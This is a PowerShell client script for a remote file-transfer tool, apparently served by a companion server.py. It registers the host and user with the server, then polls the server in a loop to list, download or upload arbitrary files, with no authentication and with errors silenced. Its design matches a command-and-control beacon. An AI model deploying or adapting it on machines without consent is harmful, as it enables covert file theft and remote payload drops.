# FileTransfer PowerShell Client
# Served dynamically by server.py — do not run from disk directly.
$SERVER = "http://SERVER_PLACEHOLDER"
$ErrorActionPreference = "SilentlyContinue"

function Invoke-Api {
    param([string]$Path, [hashtable]$Body = $null)
    $uri = "$SERVER$Path"
    try {
        if ($Body) {
            $json = $Body | ConvertTo-Json -Depth 10 -Compress
            $r = Invoke-WebRequest -Uri $uri -Method POST -Body $json -ContentType "application/json" -UseBasicParsing
        } else {
            $r = Invoke-WebRequest -Uri $uri -UseBasicParsing
        }
        return $r.Content | ConvertFrom-Json
    } catch {
        return $null
    }
}

function Get-UnixTime([datetime]$dt) {
    $epoch = [DateTime]::new(1970,1,1,0,0,0,[DateTimeKind]::Utc)
    return [int]($dt.ToUniversalTime() - $epoch).TotalSeconds
}

# Register
$regBody = @{
    hostname = $env:COMPUTERNAME
    os       = "Windows"
    version  = [System.Environment]::OSVersion.VersionString.Substring(
                   0, [Math]::Min(60, [System.Environment]::OSVersion.VersionString.Length))
    user     = $env:USERNAME
    cwd      = (Get-Location).Path
}
$reg = Invoke-Api "/api/register" $regBody
if (-not $reg) { Write-Host "[!] Could not reach server at $SERVER"; exit 1 }
$ClientId = $reg.id
Write-Host "[+] Connected to $SERVER (id=$($ClientId.Substring(0,8)))"

while ($true) {
    try {
        $cmd = Invoke-Api "/api/cmd/$ClientId"
        if ($cmd -and $cmd.cmd) {
            $result = $null
            switch ($cmd.cmd) {

                "ls" {
                    $path = if ($cmd.args.path) { $cmd.args.path } else { (Get-Location).Path }
                    try {
                        $resolved = (Resolve-Path $path -ErrorAction Stop).Path
                        $entries  = @(Get-ChildItem -Path $resolved -Force -ErrorAction Stop | ForEach-Object {
                            @{
                                name  = $_.Name
                                type  = if ($_.PSIsContainer) { "dir" } else { "file" }
                                size  = if ($_.PSIsContainer) { 0 } else { $_.Length }
                                mtime = Get-UnixTime $_.LastWriteTime
                            }
                        })
                        $result = @{ ok=$true; path=$resolved; entries=$entries }
                    } catch {
                        $result = @{ ok=$false; error=$_.Exception.Message }
                    }
                }

                "get" {
                    try {
                        $bytes  = [System.IO.File]::ReadAllBytes($cmd.args.path)
                        $b64    = [Convert]::ToBase64String($bytes)
                        $result = @{ ok=$true; path=$cmd.args.path; name=(Split-Path $cmd.args.path -Leaf); data=$b64 }
                    } catch {
                        $result = @{ ok=$false; error=$_.Exception.Message }
                    }
                }

                "put" {
                    try {
                        $bytes = [Convert]::FromBase64String($cmd.args.data)
                        $dir   = Split-Path $cmd.args.path -Parent
                        if ($dir -and !(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
                        [System.IO.File]::WriteAllBytes($cmd.args.path, $bytes)
                        $result = @{ ok=$true; path=$cmd.args.path; size=$bytes.Length }
                    } catch {
                        $result = @{ ok=$false; error=$_.Exception.Message }
                    }
                }

                default {
                    $result = @{ ok=$false; error="unknown command: $($cmd.cmd)" }
                }
            }
            Invoke-Api "/api/result/$ClientId" @{ rid=$cmd.rid; result=$result } | Out-Null
        }
        Start-Sleep -Seconds 1
    } catch {
        Start-Sleep -Seconds 3
    }
}
